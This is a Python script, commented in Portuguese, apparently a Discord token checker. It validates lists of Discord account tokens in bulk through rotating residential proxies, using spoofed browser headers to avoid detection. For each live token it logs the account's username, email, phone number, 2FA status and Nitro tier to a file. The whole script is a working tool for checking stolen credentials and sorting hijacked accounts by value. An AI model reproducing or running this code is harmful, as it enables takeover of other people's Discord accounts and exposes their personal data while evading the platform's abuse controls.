#!/usr/bin/env python3
"""
DISCORD TOKEN CHECKER v2.0 — PROXY RESIDENCIAL
Verifica tokens do Discord em massa usando proxies reais
"""

import aiohttp, asyncio, json, sys, os, time, random, base64, struct, zlib
from datetime import datetime
from colorama import Fore, Style, init
init(autoreset=True)

# ── CONFIG ──
PROXY_FILE = "/data/data/com.termux/files/home/storage/downloads/Residencial Proxys/proxies_auth.txt"
TOKEN_FILE = "tokens.txt"
OUTPUT_FILE = "tokens_validos.txt"
MAX_CONCURRENT = 50  # conexões simultâneas
TIMEOUT = 15

# ── STATS ──
stats = {"validos": 0, "invalidos": 0, "verificados": 0, "nitro": 0, "phone": 0, "email_verified": 0}

# ── CORES ──
def c(tipo, txt):
    cores = {
        "valid": f"{Fore.GREEN}[✅ VALIDO]{Fore.RESET}",
        "invalid": f"{Fore.RED}[❌ INVALIDO]{Fore.RESET}",
        "nitro": f"{Fore.MAGENTA}[⭐ NITRO]{Fore.RESET}",
        "phone": f"{Fore.CYAN}[📱 PHONE]{Fore.RESET}",
        "email": f"{Fore.YELLOW}[📧 EMAIL]{Fore.RESET}",
        "lock": f"{Fore.RED}[🔒 LOCKED]{Fore.RESET}",
        "unverify": f"{Fore.YELLOW}[⚠️ SEM EMAIL]{Fore.RESET}",
        "info": f"{Fore.BLUE}[i]{Fore.RESET}",
        "flag": f"{Fore.GREEN}[🚩]{Fore.RESET}",
        "error": f"{Fore.RED}[!]{Fore.RESET}"
    }
    return f"{cores.get(tipo, '[?]')} {txt}{Fore.RESET}"

# ── PROXIES ──
def carregar_proxies():
    proxies = []
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE) as f:
            for line in f:
                line = line.strip()
                if line and '@' in line:
                    proxies.append(f"http://{line}")
        print(c("info", f"{len(proxies)} proxies carregados"))
    else:
        print(c("error", f"Arquivo {PROXY_FILE} não encontrado!"))
        sys.exit(1)
    return proxies

# ── TOKENS ──
def carregar_tokens():
    tokens = []
    if os.path.exists(TOKEN_FILE):
        with open(TOKEN_FILE) as f:
            for line in f:
                tk = line.strip().strip('"').strip("'")
                if tk and len(tk) > 50:
                    tokens.append(tk)
        print(c("info", f"{len(tokens)} tokens carregados de {TOKEN_FILE}"))
    else:
        print(c("error", f"Cria o arquivo {TOKEN_FILE} com um token por linha!"))
        # Cria arquivo exemplo
        with open(TOKEN_FILE, 'w') as f:
            f.write("# Cola um token por linha aqui\n")
        sys.exit(1)
    return tokens

def decode_token(token):
    """Extrai ID do user e timestamp do token"""
    try:
        parts = token.split('.')
        if len(parts) >= 2:
            # Decodifica payload base64 (segunda parte)
            payload = parts[1]
            padding = 4 - len(payload) % 4
            if padding != 4:
                payload += '=' * padding
            decoded = base64.urlsafe_b64decode(payload)
            data = json.loads(decoded)
            user_id = data.get('id', '?')
            return user_id
    except:
        pass
    return '?'

def format_flags(flags):
    """Traduz flags do Discord"""
    f = int(flags)
    flags_list = []
    flag_map = {
        1: "Discord Employee",
        2: "Partnered Server Owner",
        4: "HypeSquad Events",
        8: "Bug Hunter Lvl1",
        64: "HypeSquad Bravery",
        128: "HypeSquad Brilliance",
        256: "HypeSquad Balance",
        512: "Early Supporter",
        1024: "Team User",
        2048: "System",
        4096: "Bug Hunter Lvl2",
        16384: "Verified Bot",
        65536: "Early Verified Bot Dev",
        131072: "Moderator Programs Alumni"
    }
    for flag_bit, name in flag_map.items():
        if f & flag_bit:
            flags_list.append(name)
    return ', '.join(flags_list) if flags_list else "Nenhum"

# ── VERIFICADOR ──
async def check_token(sem, token, proxy, proxies):
    async with sem:
        proxy_atual = random.choice(proxies) if len(proxies) > 20 else proxy
        hdrs = {
            "Authorization": token,
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            ]),
            "X-Super-Properties": base64.b64encode(json.dumps({
                "os":"Windows","browser":"Chrome","device":"","system_locale":"en-US",
                "browser_version":"120.0.0.0","os_version":"10",
                "referrer":"https://discord.com/channels/@me",
                "referring_domain":"discord.com","release_channel":"stable",
                "client_build_number":random.randint(210000,230000)
            }).encode()).decode()
        }
        
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as s:
            try:
                # Tenta com proxy
                async with s.get("https://discord.com/api/v10/users/@me",
                                headers=hdrs,
                                proxy=proxy_atual,
                                timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
                    
                    if r.status == 200:
                        d = await r.json()
                        user_id = d.get('id', '?')
                        username = f"{d.get('username','?')}#{d.get('discriminator','0')}"
                        email = d.get('email', '?')
                        phone = d.get('phone', '?')
                        verified = d.get('verified', False)
                        mfa = d.get('mfa_enabled', False)
                        flags = d.get('flags', 0)
                        premium = d.get('premium_type', 0)
                        banner = d.get('banner', None)
                        avatar_dec = d.get('avatar_decoration', None)
                        
                        # Premium (Nitro)
                        nitro_types = {0: "Sem Nitro", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}
                        nitro = nitro_types.get(premium, "Desconhecido")
                        
                        # Flag especiais
                        flags_str = format_flags(flags)
                        
                        # ID do token
                        tok_id = decode_token(token)
                        
                        # Exibe info
                        linha = f"\n{c('valid', f'{username} [{user_id}]')}"
                        if premium > 0:
                            linha += f" | {c('nitro', nitro)}"
                            stats["nitro"] += 1
                        if phone and phone != '?':
                            linha += f" | {c('phone', '+'+phone[:4]+'*****')}"
                            stats["phone"] += 1
                        if email and email != '?':
                            linha += f" | {c('email', email[:15]+'...' if len(email)>15 else email)}"
                            stats["email_verified"] += 1 if verified else 0
                        if mfa:
                            linha += f" | {Fore.YELLOW}[🔐 2FA]{Fore.RESET}"
                        if not verified:
                            linha += f" | {c('unverify', 'EMAIL NÃO VERIFICADO')}"
                        if flags_str != "Nenhum":
                            linha += f"\n   {c('flag', flags_str)}"
                        if banner or avatar_dec:
                            linha += f"\n   {c('flag', 'Tem banner/avatar decorativo')}"
                        
                        linha += f"\n   {c('info', f'Token ID: {tok_id[:15]}...' if len(str(tok_id))>15 else f'Token ID: {tok_id}')}"
                        proxy_str = proxy_atual.split('@')[1] if '@' in proxy_atual else '?'
                        linha += f"\n   {c('info', f'Proxy: {proxy_str}')}"
                        
                        print(linha)
                        
                        stats["validos"] += 1
                        
                        # Salva
                        with open(OUTPUT_FILE, 'a') as f:
                            f.write(f"{token} | {username} | ID: {user_id} | Nitro: {nitro} | Email: {email} | Phone: {phone} | 2FA: {mfa} | Verificado: {verified}\n")
                        
                        return True, d
                        
                    elif r.status == 429:
                        retry = int(r.headers.get('Retry-After', 2))
                        print(c("error", f"Rate limit! Esperando {retry}s..."))
                        await asyncio.sleep(retry + 1)
                        return False, None
                        
                    else:
                        text = await r.text()
                        if r.status == 401:
                            stats["invalidos"] += 1
                            if stats["invalidos"] % 10 == 0:
                                print(c("invalid", f"Total inválidos: {stats['invalidos']}"), end='\r')
                            # Mostra primeiros chars do token inválido
                            tok_preview = token[:25] + '...'
                            print(f"\r{Fore.RED}[❌] {tok_preview}{Fore.RESET}", end='')
                            return False, None
                        elif r.status == 403:
                            print(c("lock", f"Token locked/banned!"))
                            return False, None
                        else:
                            print(c("error", f"HTTP {r.status}: {text[:100]}"))
                            return False, None
                            
            except asyncio.TimeoutError:
                proxies.remove(proxy_atual) if proxy_atual in proxies else None
                return False, None
            except Exception as e:
                return False, None

# ── MAIN ──
async def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    
    print(f"""{Fore.CYAN}
╔══════════════════════════════════════════╗
║     DISCORD TOKEN CHECKER v2.0           ║
║     PROXY RESIDENCIAL MODE               ║
╚══════════════════════════════════════════╝{Fore.RESET}
""")
    
    proxies = carregar_proxies()
    tokens = carregar_tokens()
    
    if not tokens:
        return
    
    sem = asyncio.Semaphore(MAX_CONCURRENT)
    
    print(c("info", f"Iniciando verificação de {len(tokens)} tokens com {len(proxies)} proxies..."))
    print(c("info", f"Máx simultâneas: {MAX_CONCURRENT}"))
    print("─" * 60)
    
    start = time.time()
    tasks = []
    
    for token in tokens:
        proxy = random.choice(proxies)
        task = asyncio.create_task(check_token(sem, token, proxy, proxies))
        tasks.append(task)
        # Delay pequeno pra não sobrecarregar
        await asyncio.sleep(0.02)
    
    await asyncio.gather(*tasks)
    
    elapsed = time.time() - start
    
    print("\n" + "═" * 60)
    print(f"""{Fore.CYAN}
╔══════════════════════════════════════════╗
║  RESUMO FINAL                          ║
╚══════════════════════════════════════════╝{Fore.RESET}
""")
    print(f"  {Fore.GREEN}✅ Válidos:      {stats['validos']}{Fore.RESET}")
    print(f"  {Fore.RED}❌ Inválidos:    {stats['invalidos']}{Fore.RESET}")
    print(f"  {Fore.MAGENTA}⭐ Com Nitro:    {stats['nitro']}{Fore.RESET}")
    print(f"  {Fore.CYAN}📱 Com Phone:    {stats['phone']}{Fore.RESET}")
    print(f"  {Fore.YELLOW}📧 Email Verif:  {stats['email_verified']}{Fore.RESET}")
    print(f"  {Fore.BLUE}⏱️ Tempo:        {elapsed:.1f}s{Fore.RESET}")
    print(f"  {Fore.WHITE}📁 Salvos em:    {OUTPUT_FILE}{Fore.RESET}")
    print("═" * 60)

if __name__ == "__main__":
    # Instala dependências se necessário
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrompido pelo usuário{Fore.RESET}")
    except Exception as e:
        print(f"\n{Fore.RED}[FATAL] {e}{Fore.RESET}")
        import traceback
        traceback.print_exc()
